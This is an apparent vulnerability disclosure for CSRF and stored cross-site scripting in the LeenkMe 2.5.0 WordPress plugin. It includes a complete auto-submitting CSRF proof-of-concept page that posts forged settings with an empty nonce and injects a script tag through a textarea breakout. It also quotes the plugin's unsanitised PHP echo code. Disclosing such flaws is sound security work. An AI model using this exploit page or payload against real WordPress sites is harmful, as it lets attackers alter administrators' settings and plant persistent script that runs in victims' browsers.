@@ -1,0 +1,117 @@
+I would like to disclose CSRF and stored XSS vulnerability in Wordpress
+plugin LeenkMe version 2.5.0.
+
+The plugin can be found at https://wordpress.org/plugins/leenkme/
+
+In the page wp-content/plugins/leenkme/facebook.php
+
+XSS vulnerable Fields are :
+
+   - facebook_message
+   - facebook_linkname
+   - facebook_caption
+   - facebook_description
+   - default_image
+   - _wp_http_referer
+
+
+This CSRF is tested on latest wordpress installation 4.4.2 using firefox
+browser.
+
+The Code for CSRF.html is
+
+<html>
+  <body onload="document.forms['xss'].submit()" >
+    <form name="xss" action="
+http://127.0.0.1/wp/wp-admin/admin.php?page=leenkme_facebook" method="POST">
+      <input type="hidden" name="facebook_profile" value="on" />
+      <input type="hidden" name="fb_publish_wpnonce" value="" />
+      <input type="hidden" name="_wp_http_referer" value="XSS" />
+      <input type="hidden" name="facebook_message" value="XSS" />
+      <input type="hidden" name="facebook_linkname" value="XSS" />
+      <input type="hidden" name="facebook_caption" value="XSS" />
+      <input type="hidden" name="facebook_description" value="
+&lt;/textarea&gt;<script>prompt();</script>" />
+      <input type="hidden" name="default_image" value="XSS" />
+      <input type="hidden" name="message_preference" value="author" />
+      <input type="hidden" name="clude" value="in" />
+      <input type="hidden" name="publish_cats&#91;&#93;" value="0" />
+      <input type="hidden" name="update_facebook_settings"
+value="Save&#32;Settings" />
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+
+The vulnerable page is
+
+wp-content/plugins/leenkme/facebook.php
+
+The vulnerable code producing XSS is
+
+
+if ( !empty( $_REQUEST['facebook_message'] ) )
+$user_settings['facebook_message'] = $_REQUEST['facebook_message'];
+else
+$user_settings['facebook_message'] = '';
+if ( !empty( $_REQUEST['facebook_linkname'] ) )
+$user_settings['facebook_linkname'] = $_REQUEST['facebook_linkname'];
+else
+$user_settings['facebook_linkname'] = '';
+if ( !empty( $_REQUEST['facebook_caption'] ) )
+$user_settings['facebook_caption'] = $_REQUEST['facebook_caption'];
+else
+$user_settings['facebook_caption'] = '';
+if ( !empty( $_REQUEST['facebook_description'] ) )
+$user_settings['facebook_description'] = $_REQUEST['facebook_description'];
+
+
+-------------------------
+-------------------------
+-------------------------
+snip
+------------------------
+-------------------------
+--------------------------
+
+<td><textarea name="facebook_message" style="width: 500px;"
+maxlength="400"><?php
+echo $user_settings['facebook_message']; ?>&lt;/textarea&gt;</td>
+                            </tr>
+                            <tr>
+                             <td><?php _e( 'Default Link Name:', 'leenkme'
+); ?></td>
+                                <td><input name="facebook_linkname"
+type="text" style="width: 500px;" value="<?php echo
+$user_settings['facebook_linkname']; ?>"  maxlength="100"/></td>
+                            </tr>
+                            <tr>
+                             <td><?php _e( 'Default Caption:', 'leenkme' );
+?></td>
+                                <td><input name="facebook_caption"
+type="text" style="width: 500px;" value="<?php echo
+$user_settings['facebook_caption']; ?>" maxlength="100"/></td>
+                            </tr>
+                            <tr>
+                             <td style='vertical-align: top; padding-top:
+5px;'><?php _e( 'Default Description:', 'leenkme' ); ?></td>
+                                <td><textarea name="facebook_description"
+style="width: 500px;" maxlength="300"><?php echo
+$user_settings['facebook_description']; ?>&lt;/textarea&gt;</td>
+
+
+The code used to protect against CSRF that is the anti csrf token used is
+
+<?php wp_nonce_field( 'fb_publish', 'fb_publish_wpnonce' ); ?>
+
+
+But this code is not protecting against the CSRF, the form get submitted
+successfully with out any error even though the fb_publish_wpnonce is kept
+empty resulting in CSRF vulnerability.
+
+
+
+# Author email: cor3sm4sh3r[at]gmail.com
+# Contact: https://in.linkedin.com/in/cor3sm4sh3r
+# Twitter: https://twitter.com/cor3sm4sh3r
